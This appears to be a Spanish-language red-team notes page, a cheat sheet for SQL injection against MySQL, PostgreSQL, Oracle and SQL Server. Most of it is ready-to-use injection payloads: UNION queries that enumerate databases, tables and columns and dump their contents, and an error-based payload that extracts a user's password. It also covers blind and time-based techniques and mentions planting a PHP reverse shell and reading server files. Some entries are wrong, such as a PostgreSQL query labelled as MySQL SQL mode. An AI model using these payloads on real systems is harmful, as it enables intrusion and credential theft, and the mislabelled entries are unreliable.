---
title: SQLI
type: docs
prev: docs/first-page
weight: 8
sidebar:
  open: false
---

## PARTE 1

### LISTAMOS INFORMACION DE LA BASE DE DATOS

#### TIPO DE BASE DE DATOS

![](/images/red_team/web/20241030124059.png)

![](/images/red_team/web/20241030124147.png)

#### TIPO Y VERSION DE BASE DE DATOS

PostgreSQL

```sql
SELECT version();
```

MySQL y MariaDB , Microsoft SQL Server

```sql
SELECT @@version;
```

Oracle

```sql
SELECT banner FROM v$version
SELECT version FROM v$instance
```

#### USUARIO DB QUE EJECUTA LA BASE DE DATOS

PostgreSQL

```sql
SELECT current_user;

SELECT session_user;
```

MySQL y MariaDB

```sql
SELECT USER();

SELECT CURRENT_USER();
```

Microsoft SQL Server

```sql
SELECT SUSER_NAME();

SELECT SUSER_SNAME();
```

Oracle

```sql
SELECT OWNER FROM dual;/propietarios de tablas para luego hacer un where por cada uno de ellos

SELECT USER FROM dual;
SELECT SYS_CONTEXT('USERENV', 'CURRENT_USER') FROM dual;
```

#### BASE DE DATOS ACTIVA

PostgreSQL, MySQL y MariaDB ,Oracle

```sql
SELECT database();
```

Microsoft SQL Server

```sql
SELECT DB_NAME();
```

#### FECHA Y HORA ACTUAL

PostgreSQL, MySQL y MariaDB ,Oracle , Microsoft SQL Server

```sql
SELECT CURRENT_TIMESTAMP;
```

#### ID DE SESSION

PostgreSQL

```sql
SELECT pg_backend_pid();
```

MySQL y MariaDB

```sql
SELECT CONNECTION_ID();
```

Microsoft SQL Server

```sql
SELECT @@SPID;
```

Oracle

```sql
SELECT SYS_CONTEXT('USERENV', 'SID') FROM dual;
```

#### USUARIO DEL SISTEMA OPERATIVO

PostgreSQL

```sql
SELECT current_setting('os_user');
```

Microsoft SQL Server

```sql
SELECT SYSTEM_USER;
```

Oracle

```sql
SELECT SYS_CONTEXT('USERENV', 'OS_USER') FROM dual;
```

#### MODO SQL ACTIVO

MySQL y MariaDB

```sql
SELECT COUNT(*) FROM pg_stat_activity;
```

#### PARAMETROS DE CONFIGURACION

AQUI PODEMOS VER VARIABLES BASE DE DATOS  DEL SISTEMA , NO DEL USUARIO , ESO SE HACE MANUAL CON :  SELECT @mi_variable1 AS 'Variable 1';

PostgreSQL

```sql
SHOW ALL;
```

MySQL y MariaDB

```sql
SHOW VARIABLES;
```

Oracle

```sql
SELECT name, value FROM v$parameter;
```

#### PRIVILEGIOS Y ROLES

PostgreSQL

```sql
SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user;
```

MySQL y MariaDB

```sql
SHOW GRANTS FOR CURRENT_USER();
```

Microsoft SQL Server

```sql
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
```

Oracle

```sql
SELECT * FROM user_role_privs;
```

EXTRA:

### INJECCION DE CODIGO PHP EN SQL PARA LUEGO QUE PHP CUANDO LO RENDERISE LO INTERPRETE

![](/images/red_team/web/20241030214310.png)

### INJECCION DE CODIGO PHP A UN ARCHIVO Y LUEGO LEERLO DESDE UNA RUTA

-supongamos que puedas guardar este codigo php en /var/www/web1/reverse.php
luego tu podrias apuntar desde la web hacia <http://host/reverse.php> y esto podria interpretarse
![](/images/red_team/web/20241030214636.png)

### LEER ARCHIVOS DE LA MAQUINA  

![](/images/red_team/web/20241030214417.png)

## PARTE 2

CHEAT SHEET:
<https://portswigger.net/web-security/sql-injection/cheat-sheet>
detecting sql injection:
<https://portswigger.net/web-security/sql-injection#how-to-detect-sql-injection-vulnerabilities>
BUSCAR DATO VISIBLE
<https://portswigger.net/web-security/sql-injection/union-attacks#finding-columns-with-a-useful-data-type>
![[Pasted image 20241030215846.png]]

INFORMACION DE LA DB , USUARIO DB ,  USUARIO ETC/PASSWD , VERSION  Y OTRAS COSAS MAS EN EXTRA V1 : [[EXTRA V1]]

## COSAS IMPORTANTES

-probar variantes tipo comentarios (  -- -  |  --  |   ;   |   ##  )

## LISTAR BASE DE DATOS

URL VULNERABLE A SQLI

![[Pasted image 20241030122352.png]]
![[Pasted image 20241030122521.png]]
DETERMINAMOS EL TAMAÑO DE LA TABLA

### MYSQL

#### ORDER BY

##### MYSQL-PostgreSQL ORACLE

```python
CODE_VULNERABLE' ORDER BY 1 -- -

CODE_VULNERABLE' ORDER BY 2 -- -

CODE_VULNERABLE' ORDER BY 3 -- -
```

EJEMPLO:SI FUNCIONA EN 1 Y 2 , PERO FALLA EN 3 , ESPORQUE NO EXISTE LA 3 COLUMNAY SOLO EXISTEN 2 COLUMNAS
![[Pasted image 20241030123658.png]]

CORROBORAMOS ESTO CON EL UNION

#### UNION

##### MYSQL-PostgreSQL

```python
CODE_VULNERABLE' UNION SELECT NULL -- -

CODE_VULNERABLE' UNION SELECT NULL,NULL -- -

CODE_VULNERABLE' UNION SELECT NULL,NULL,NULL -- -
```

##### ORACLE

```python
CODE_VULNERABLE' UNION SELECT NULL FROM DUAL -- -

CODE_VULNERABLE' UNION SELECT NULL,NULL FROM DUAL -- -

CODE_VULNERABLE' UNION SELECT NULL,NULL,NULL FROM DUAL -- -
```

donde si colocamos  "NULL,NULL,NULL" daría error
![[Pasted image 20241030123612.png]]

## OBTENER LAS BASE DE DATOS DISPONIBLES

### MYSQL-PostgreSQL

```SQL
code' UNION SELECT schema_name FROM information_schema.schemata -- -
```

![[Pasted image 20241030182002.png]]

### ORACLE

!!!!solo puedes ver la base de datos en la que estas !!!

```python
code' UNION SELECT GLOBAL_NAME FROM GLOBAL_NAME -- -
code' UNION SYS_CONTEXT('USERENV', 'DB_NAME') FROM DUAL -- -
```

![[Pasted image 20241030223309.png]]

## OBTENER TABLAS DE LA BASE DE DATOS

### MYSQL-PostgreSQL

```SQL
code' UNION SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema='*name-database' -- -
```

![[Pasted image 20241030184826.png]]

### ORACLE

```PYTHON
code' UNION SELECT TABLE_NAME FROM USER_TABLES -- -
code' UNION SELECT OWNER,TABLE_NAME FROM ALL_TABLES -- -
#COMO ADMINISTRADOR
code' UNION SELECT OWNER,TABLE_NAME FROM DBA_TABLES -- -
```

![[Pasted image 20241030224215.png]]

## OBTENER COLUMNAS DE LA BASE DE DATOS

### MYSQL-PostgreSQL

```SQL
code' UNION SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='*nombre-tabla*' -- -
```

![[Pasted image 20241030184659.png]]

### ORACLE

EN TODOS LOS CASOS SE PUEDE SACAR MAS INFORMACION DE LA TABLA

```sql
SELECT COLUMN_NAME, DATA_TYPE, DATA_LENGTH, NULLABLE FROM USER_TAB_COLUMNS
```

```python
code' UNION SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE TABLE_NAME='*nombre-tabla*' -- -

code' UNION SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='*nombre-tabla*' -- -
#COMO ADMINISTRADOR
code' UNION SELECT COLUMN_NAME FROM DBA_TAB_COLUMNS WHERE TABLE_NAME='*nombre-tabla*' -- -

```

![[Pasted image 20241030225403.png]]

## OBTENER COLUMNAS DE LA BASE DE DATOS

### MYSQL-PostgreSQL

```SQL
code' UNION SELECT COLUMNA1,COLUMNA2 FROM *table-name*  -- -
```

![[Pasted image 20241030190322.png]]

### ORACLE

```SQL
code' UNION SELECT COLUMNA1,COLUMNA2 FROM *table-name*  -- -
```

![[Pasted image 20241030230113.png]]

## BLIND SQLI(sql injection blind)

[SQL INJECION - SQLI CHEAT SHEET LUND133369](https://lund133369.github.io/SQLI-sql-injection-cheet-sheet)

### CONDITIONAL REPONSE

condicion de respuesta
la respuesta se puede filtrar por varios tipos como :

- r.status_code  ,  r.headers  ,  r.cookies  ,  r.text  ,  r.json()  ,  r.url
![[Pasted image 20241106152731.png]]

### CONDITIONAL ERRORS

condicion de error

![[Pasted image 20241113174541.png]]

TIPO UNION - UNION
![[Pasted image 20241108192325.png]]

![[Pasted image 20241108192725.png]]

TIPO OR - ||

![[Pasted image 20241108192638.png]]

![[Pasted image 20241108192538.png]]

### CONDITIONAL VISIBLE ERROR-BASED

condicion visible basado en error

```sql
CODE' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

![[Pasted image 20241113173941.png]]

### CONDITIONAL TIME DELAYS

condicion tiempo
![[Pasted image 20241113175218.png]]

la peticion demora mas de 5 segundos es que si es vulnerable
![[Pasted image 20241113183407.png]]

### CONDITIONAL TIME DELAYS AND INFORMATION RETRIEVAL

condicion tiempo y recuperacion de informacion
![[Pasted image 20241113183218.png]]

### CONDITIONAL WITH OUT-OF-BAN INTERACTION

condicion con interacion de ban

### CONDITIONAL WITH OUT-OF-BAN EXFILTRATION

condicion con exfiltracion de ban

### CONDITIONAL WITH FILTER BYPASS VIA XML

condicion con evasion de filtro via xml

## EXTRA

### CONTACTENACION

#### strings concatenation (listar múltiple  data en una sola columna)

![[Pasted image 20241106130536.png]]

##### USANDO CONCATENADORES

![[Pasted image 20241106132204.png]]

##### USANDO  CONCAT  O GROUP_CONCAT

![[Pasted image 20241106132303.png]]

### LONGITUD DE UN RESULTADO(sql len , length)

En SQL, para obtener la longitud del resultado de una consulta, puedes usar funciones específicas para medir la longitud de cadenas de texto. La función varía según el motor de base de datos:

1. **En MySQL**: Puedes usar la función `LENGTH()` para medir el número de bytes, o `CHAR_LENGTH()` para medir el número de caracteres.

```sql
SELECT LENGTH(user) AS longitud_en_bytes,CHAR_LENGTH(user) AS longitud_en_caracteres
FROM users WHERE user = 'pepe';
```

- **`LENGTH(user)`** devuelve la longitud en bytes.
- **`CHAR_LENGTH(user)`** devuelve la longitud en caracteres.

   **Nota**: Si `user` contiene caracteres multibyte (como en UTF-8), `LENGTH()` puede devolver un valor mayor que `CHAR_LENGTH()`.

2. **En SQL Server**: Utiliza la función `LEN()` para obtener la longitud en caracteres.

```sql
SELECT LEN(user) AS longitud FROM users WHERE user = 'pepe';
```

3. **En PostgreSQL**: Usa la función `LENGTH()` para obtener la longitud en caracteres.

```sql
SELECT LENGTH(user) AS longitud FROM users WHERE user = 'pepe';
```

4. **En Oracle**: Usa la función `LENGTH()` para obtener la longitud en caracteres.

```sql
SELECT LENGTH(user) AS longitud FROM users WHERE user = 'pepe';
```

EJEMPLO:

AQUI USAMOS OPERADORES LOGICOS (flecha rojo) > ,< ,= para indicar que si alguna condición se cumple con respecto a la longitud de la password(flecha verde)
![[Pasted image 20241106145250.png]]
